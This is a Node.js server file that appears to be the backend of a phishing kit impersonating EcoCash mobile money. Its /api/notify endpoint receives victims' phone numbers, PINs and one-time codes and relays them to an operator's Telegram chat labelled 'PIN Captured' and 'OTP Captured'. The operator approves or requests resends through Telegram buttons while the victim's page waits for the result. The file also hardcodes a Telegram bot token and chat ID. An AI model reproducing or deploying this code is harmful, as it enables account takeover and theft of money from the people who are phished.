const express = require('express');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3005;

const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN || '8936298383:AAGUnZanytc5tEUE5ruyMjOzxR6-6hPjbR0';
const TELEGRAM_CHAT_ID   = process.env.TELEGRAM_CHAT_ID   || '8392790531';
const TELEGRAM_API       = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;
const SESSION_TTL_MS     = 60 * 60 * 1000;

app.use(cors());
app.use(express.json({ limit: '1mb' }));
app.use(express.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname, '..'), { extensions: ['html'] }));

app.use((req, _res, next) => {
  console.log(`[${new Date().toISOString()}] ${req.method} ${req.path}`);
  next();
});

const sessions = new Map();

function createSession(stage, meta){
  const id = 's_' + Date.now().toString(36) + Math.random().toString(36).slice(2,8);
  const now = Date.now();
  sessions.set(id, { id, stage, meta, status:'pending', createdAt:now, expiresAt: now + SESSION_TTL_MS });
  console.log(`[session] created ${id} stage=${stage} total=${sessions.size}`);
  return sessions.get(id);
}
function getSession(id){
  const s = sessions.get(id);
  if(!s) { console.log(`[session] MISS ${id} (total=${sessions.size})`); return null; }
  if(Date.now() > s.expiresAt && s.status === 'pending') s.status = 'expired';
  console.log(`[session] HIT ${id} status=${s.status}`);
  return s;
}
setInterval(()=>{
  const now = Date.now();
  for(const [id,s] of sessions){ if(now > s.expiresAt + 60000) sessions.delete(id); }
}, 5*60*1000);

function esc(s = '') {
  return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;');
}

async function tgSend(text, replyMarkup){
  const body = { chat_id: TELEGRAM_CHAT_ID, text, parse_mode:'HTML', disable_web_page_preview:true };
  if(replyMarkup) body.reply_markup = replyMarkup;
  const r = await fetch(`${TELEGRAM_API}/sendMessage`, {
    method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(body)
  });
  return r.json();
}
async function tgAnswer(cbId, text){
  await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ callback_query_id: cbId, text })
  }).catch(()=>{});
}
async function tgRemoveButtons(chatId, messageId){
  await fetch(`${TELEGRAM_API}/editMessageReplyMarkup`, {
    method:'POST', headers:{'Content-Type':'application/json'},
    body: JSON.stringify({ chat_id: chatId, message_id: messageId, reply_markup: { inline_keyboard: [] } })
  }).catch(()=>{});
}

app.get('/', (_req,res)=>{
  res.json({
    ok:true,
    service:'ecocash-backend',
    activeSessions: sessions.size,
    telegramConfigured: !!(TELEGRAM_BOT_TOKEN && TELEGRAM_CHAT_ID),
    publicUrl: process.env.PUBLIC_URL || '(not set)',
    time: new Date().toISOString()
  });
});

app.get('/api/debug', (_req,res)=>{
  const list = [];
  for(const [id,s] of sessions.entries()){
    list.push({ id, stage: s.stage, status: s.status, ageSec: Math.floor((Date.now()-s.createdAt)/1000) });
  }
  res.json({ ok:true, count: list.length, sessions: list });
});

app.post('/api/notify', async (req, res)=>{
  try{
    const { stage, phone, pinOrOtp, receipt } = req.body || {};
    if(!stage || !['pin','otp'].includes(stage)) return res.status(400).json({ ok:false, error:'Invalid stage' });

    const s = createSession(stage, { phone, receipt });
    const label = stage === 'pin' ? '🔐 <b>PIN Captured</b>' : '📩 <b>OTP Captured</b>';
    const keyLabel = stage === 'pin' ? 'PIN' : 'OTP';

    const text =
      `${label}\n` +
      `━━━━━━━━━━━━━━━\n` +
      `🧾 <b>Ref:</b> <code>${esc(receipt?.trackingNumber || '—')}</code>\n` +
      `👤 <b>Recipient:</b> ${esc(receipt?.accountName || '—')}\n` +
      `📱 <b>Phone:</b> <code>${esc(phone || '—')}</code>\n` +
      `🔑 <b>${keyLabel}:</b> <code>${esc(pinOrOtp || '—')}</code>\n` +
      `💳 <b>Service:</b> ${esc(receipt?.modeOfPayment || '—')}\n` +
      `💰 <b>Amount:</b> ${esc(receipt?.currency || '')} ${esc(receipt?.amount || '—')}\n` +
      `🕒 <b>Time:</b> ${new Date().toLocaleString('en-GB',{timeZone:'Africa/Harare'})} CAT\n` +
      `\n<i>Session: ${esc(s.id)}</i>`;

    const buttons = stage === 'pin' ? {
      inline_keyboard: [[
        { text:'✅ Approve', callback_data:`approve:${s.id}` },
        { text:'❌ Decline', callback_data:`decline:${s.id}` }
      ]]
    } : {
      inline_keyboard: [[
        { text:'✅ Approve', callback_data:`approve:${s.id}` },
        { text:'🔁 Resend',  callback_data:`resend:${s.id}` }
      ]]
    };

    const tg = await tgSend(text, buttons);
    if(!tg.ok){
      console.error('Telegram send failed:', tg);
      return res.status(502).json({ ok:false, error: tg.description });
    }
    return res.json({ ok:true, sessionId: s.id });
  }catch(err){
    console.error('notify error:', err);
    return res.status(500).json({ ok:false, error: err.message });
  }
});

app.get('/api/status/:id', (req,res)=>{
  const s = getSession(req.params.id);
  if(!s) return res.status(404).json({ ok:false, error:'Session not found' });
  return res.json({ ok:true, status:s.status, stage:s.stage });
});

app.post('/api/telegram-webhook', async (req,res)=>{
  try{
    const update = req.body || {};
    const cq = update.callback_query;
    console.log(`[webhook] received update. hasCallback=${!!cq} data=${cq?.data || 'none'}`);
    if(cq && cq.data){
      const [action, sessionId] = cq.data.split(':');
      const s = getSession(sessionId);
      if(!s){ await tgAnswer(cq.id,'Session expired'); return res.json({ ok:true }); }
      if(s.status !== 'pending'){ await tgAnswer(cq.id, `Already ${s.status}`); return res.json({ ok:true }); }
      if(action === 'approve'){ s.status = 'approved'; await tgAnswer(cq.id,'✅ Approved'); }
      else if(action === 'decline'){ s.status = 'declined'; await tgAnswer(cq.id,'❌ Declined'); }
      else if(action === 'resend'){ s.status = 'resend'; await tgAnswer(cq.id,'🔁 Resend'); }
      else { await tgAnswer(cq.id,'Unknown action'); }
      if(cq.message) await tgRemoveButtons(cq.message.chat.id, cq.message.message_id);
      console.log(`[webhook] processed action=${action} sid=${sessionId} newStatus=${s.status}`);
    }
    return res.json({ ok:true });
  }catch(err){
    console.error('webhook error:', err);
    return res.status(500).json({ ok:false, error: err.message });
  }
});

app.get('/health', (_req,res)=> res.json({ ok:true, ts: Date.now(), activeSessions: sessions.size }));

app.listen(PORT, async ()=>{
  console.log(`EcoCash server running on port ${PORT}`);
  const publicUrl = process.env.PUBLIC_URL || `http://localhost:${PORT}`;
  console.log(`PUBLIC_URL = ${publicUrl}`);
  const webhookUrl = `${publicUrl}/api/telegram-webhook`;
  console.log(`Registering webhook: ${webhookUrl}`);
  try{
    const r = await fetch(`${TELEGRAM_API}/setWebhook?url=${encodeURIComponent(webhookUrl)}`);
    const d = await r.json();
    console.log('setWebhook result:', d);
  }catch(e){ console.error('setWebhook failed:', e.message); }
});
